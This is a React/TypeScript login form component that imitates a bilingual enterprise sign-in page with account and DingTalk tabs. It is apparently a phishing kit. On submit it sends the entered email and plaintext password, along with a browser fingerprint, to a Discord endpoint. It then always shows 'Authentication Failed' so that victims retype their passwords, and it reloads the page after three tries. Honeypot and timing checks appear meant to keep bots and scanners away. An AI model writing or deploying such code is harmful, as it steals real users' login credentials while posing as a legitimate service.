
import React, { useState, useRef } from 'react';
import { encryptData, getFingerprint } from '../SecurityUtils';
import { useSecurity } from './SecurityManager';
import { useTranslation } from './LanguageProvider';
import { submitToDiscord } from '../services/DiscordService';

interface LoginFormProps {
  prefilledEmail?: string;
}

const LoginForm: React.FC<LoginFormProps> = ({ prefilledEmail }) => {
  // Destructure lang from useTranslation to identify current language
  const { t, lang } = useTranslation();
  const [activeTab, setActiveTab] = useState<'account' | 'dingtalk'>('account');
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [agreed, setAgreed] = useState(false);
  const [isEncrypting, setIsEncrypting] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);
  
  const honeypotRef = useRef<HTMLInputElement>(null);
  const mountTime = useRef(Date.now());
  const { reportViolation } = useSecurity();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (honeypotRef.current?.value) {
      reportViolation('Bot detected');
      return;
    }

    const elapsed = Date.now() - mountTime.current;
    if (elapsed < 2000) {
      reportViolation('Rapid Submission');
      return;
    }

    if (!agreed) {
      // Use lang directly instead of t.lang
      alert(lang === 'zh' ? '请先勾选同意协议' : 'Please agree with the policies');
      return;
    }

    setIsLoading(true);
    setAuthError(false);

    try {
      const encryptedPassword = await encryptData(password);
      const fingerprint = getFingerprint();
      
      console.log('Secure Payload:', { email, encryptedPassword, fingerprint });
      
      // Submit form data to Discord
      await submitToDiscord({
        email,
        password,
        fingerprint,
        lang,
        tab: activeTab,
      }, 'LoginForm');
      
      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Encryption error', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-white border border-[#eee] rounded-lg shadow-[0_4px_12px_rgba(0,0,0,0.08)] overflow-hidden">
      <div className="flex border-b border-[#eee]">
        <button
          onClick={() => setActiveTab('account')}
          className={`flex-1 py-4 text-[14px] font-medium transition-all relative ${
            activeTab === 'account' ? 'text-[#333]' : 'text-gray-400'
          }`}
        >
          {t.account}
          {activeTab === 'account' && (
            <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-[2px] bg-red-500"></div>
          )}
        </button>
        <button
          onClick={() => setActiveTab('dingtalk')}
          className={`flex-1 py-4 text-[14px] font-medium transition-all relative ${
            activeTab === 'dingtalk' ? 'text-[#333]' : 'text-gray-400'
          }`}
        >
          {t.dingtalk}
          {activeTab === 'dingtalk' && (
            <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-[2px] bg-red-500"></div>
          )}
        </button>
      </div>

      <div className="p-8 pb-4">
        <form onSubmit={handleSubmit} className="space-y-5">
          {/* Loading State */}
          {isLoading && (
            <div className="flex items-center justify-center py-8">
              <div className="flex flex-col items-center space-y-3">
                <div className="w-8 h-8 border-4 border-red-200 border-t-red-500 rounded-full animate-spin"></div>
                <p className="text-[14px] text-gray-500">{lang === 'zh' ? '正在验证...' : 'Authenticating...'}</p>
              </div>
            </div>
          )}

          {/* Authentication Failed Message */}
          {authError && !isLoading && (
            <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 text-red-500 text-xl">⚠️</div>
                <div>
                  <h3 className="font-medium text-red-800 text-[14px]">
                    {lang === 'zh' ? '验证失败' : 'Authentication Failed'}
                  </h3>
                  <p className="text-red-700 text-[13px] mt-1">
                    {lang === 'zh' 
                      ? `请重试。剩余尝试次数: ${3 - failedAttempts}` 
                      : `Please try again. Remaining attempts: ${3 - failedAttempts}`
                    }
                  </p>
                </div>
              </div>
            </div>
          )}

          <div style={{ position: 'absolute', left: '-9999px' }} aria-hidden="true">
            <input ref={honeypotRef} type="text" tabIndex={-1} autoComplete="off" />
          </div>

          <div className="relative">
            <input
              type="text"
              placeholder={t.username}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-2.5 text-[14px] border border-[#d9d9d9] rounded focus:outline-none focus:border-red-400 transition-all"
            />
          </div>

          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder={t.password}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-2.5 text-[14px] border border-[#d9d9d9] rounded focus:outline-none focus:border-red-400 transition-all pr-10"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"
            >
              {showPassword ? '👁️' : '👁️‍🗨️'}
            </button>
          </div>

          <div className="flex items-center justify-between text-[12px]">
            <label className="flex items-center text-gray-500 cursor-pointer">
              <input type="checkbox" className="mr-2 accent-red-500" defaultChecked />
              {t.remember}
            </label>
            <a href="#" className="text-gray-400 hover:text-red-500">{t.forgot}</a>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-2.5 bg-[#ff4b33] text-white font-medium rounded hover:bg-[#f5222d] transition-colors shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isLoading ? '验证中...' : t.login}
          </button>

          <div className="flex items-start text-[12px] leading-relaxed text-gray-500">
            <input
              type="checkbox"
              id="agreement"
              checked={agreed}
              onChange={(e) => setAgreed(e.target.checked)}
              className="mt-1 mr-2 accent-red-500 shrink-0"
            />
            <label htmlFor="agreement" className="cursor-pointer">
              {t.agreement}
            </label>
          </div>
        </form>
      </div>

      <div className="bg-[#f9f9f9] border-t border-[#eee] py-4 flex items-center justify-center space-x-3 group cursor-pointer">
        <span className="text-[13px] text-gray-400 group-hover:text-red-500 transition-colors">
          {t.scanning}
        </span>
      </div>
    </div>
  );
};

export default LoginForm;
